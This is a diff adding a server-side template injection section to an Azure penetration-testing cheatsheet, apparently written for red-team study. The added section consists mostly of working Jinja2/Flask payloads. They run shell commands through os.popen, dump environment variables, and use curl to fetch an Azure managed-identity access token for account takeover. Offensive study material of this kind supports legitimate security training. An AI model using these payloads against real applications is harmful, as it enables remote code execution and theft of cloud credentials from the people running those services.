@@ -93,7 +93,8 @@ Get-AzKeyVault
     - [storage blobs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#storage-blobs)
     - [Application Proxy - Users who can access](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-able-to-access-appproxy)
 - Web Application Exploitation
-    - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)     
+    - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)
+    - [Template Injection]() 
 - Runbooks & RunCommand
   - [Create Runbook](https://github.com/conma293/Azure/blob/main/cheatsheet.md#create-runbooks)
   - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
@@ -470,7 +471,25 @@ Now we can launch an session
 ```
 Connect-AzAccount -AccessToken $Token -AccountId <client_id>
 ```
+## SSTI
+OR FOR SSTI:
 
+
+```{{config.items()}}```
+We know this app is running flask (from }config.items()} injection)
+
+Therefore we can just use the popen call from the os module:
+```
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
+```
+
+ENV will give us the Identity Header which is the ClientID and the Identity Endpoint - copy these down to notepad as per usual
+
+Now Let's request the access token for the managed identity now using the following code:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
 * * * 
 
 # Playbooks
